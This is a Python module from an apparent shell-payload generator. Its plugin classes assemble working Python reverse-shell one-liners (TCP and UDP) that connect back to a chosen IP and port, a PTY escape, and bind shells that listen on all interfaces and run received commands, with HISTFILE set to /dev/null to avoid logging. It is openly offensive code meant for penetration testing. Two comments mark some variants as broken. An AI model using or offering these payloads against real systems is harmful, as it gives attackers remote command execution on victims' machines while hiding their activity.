from ogabog.cores import plugin, const
from ogabog.cores.argutils import is_write_file


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--exec",
            default="pty",
            choices=[
                'pty',
                'subprocess',
            ]
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.extension = "py"
        self.set_write_file()
        self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        self.protocol = "tcp"
        self.shell_type = 1

    def make_shell(self):
        self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
        if self.protocol == "udp":
            self.shell += f"""socket.SOCK_DGRAM);s.connect(("{self.args.ip}",{self.args.port}));"""
        else:
            self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
        self.shell += """os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(), 2);"""
        if self.args.exec == "pty":
            self.shell += f"""import pty;pty.spawn("{self.args.shell}")'"""
        elif self.args.exec == "subprocess":
            self.shell += f"""p=subprocess.call(["{self.args.shell}","-i"]);'"""


class PTY(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.shell_type = 0
        self.is_interactive = True
        self.opts.description = "[PTYShell] Python PTY shell escape from https://netsec.ws/?p=337"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.protocol = "udp"
        self.shell_type = 1
        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."


class BindTCP(plugin.BindShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--exec",
            default="pty",
            choices=[
                'pty',
                'subprocess',
            ]
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.extension = "py"
        self.opts.description = "[BindShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description = "\n[BindShell][TCP] Python from infodox/python-pty-shells. License WTFPL."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        self.set_write_file()
        self.protocol = "tcp"
        self.shell_type = 2
        self.is_interactive = True

    def make_shell(self):
        if self.args.exec == "pty":
            self.shell = "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            self.shell += f"s.bind((\"0.0.0.0\",{self.args.port}));"
            self.shell += "s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);"
            self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);"
            self.shell += f"os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"{self.args.shell}\");s.close()"
        else:
            # FIXME onelinar from terminal has problem
            self.shell = "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);"
            self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));"
            self.shell += "s1.listen(1);c,a=s1.accept();while True:;\td=c.recv(1024).decode();"
            self.shell += "\tp=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
            self.shell += "\tc.sendall(p.stdout.read()+p.stderr.read())"
        if is_write_file():
            self.shell = self.shell.replace(";", "\n")
        else:
            self.shell = f"{self.args.type} -c '" + self.shell + "\'"


class BindUDP(BindTCP):
    def __init__(self):
        super().__init__()
        self.protocol = "udp"
        self.opts.description = "[BindShell][UDP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        if self.args.exec == "pty":
            # FIXME file rem.fileno error byte object (UDP)
            self.shell = "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
            self.shell += f"s.bind((\"0.0.0.0\",{self.args.port}));(rem,addr)=s.recvfrom(1024);os.dup2(rem.fileno(),0);"
            self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");"
            self.shell += f"pty.spawn(\"{self.args.shell}\");s.close()"
        else:
            self.shell = "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_DGRAM);"
            self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));"
            self.shell += "while True:;\tmsg=s1.recvfrom(1024);\td=msg[0].decode();"
            self.shell += "\tp=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
            self.shell += "\ts1.sendto(p.stdout.read()+p.stderr.read(), msg[1])"
        if is_write_file():
            self.shell = self.shell.replace(";", "\n")
        else:
            self.shell = f"{self.args.type} -c '" + self.shell + "\'"
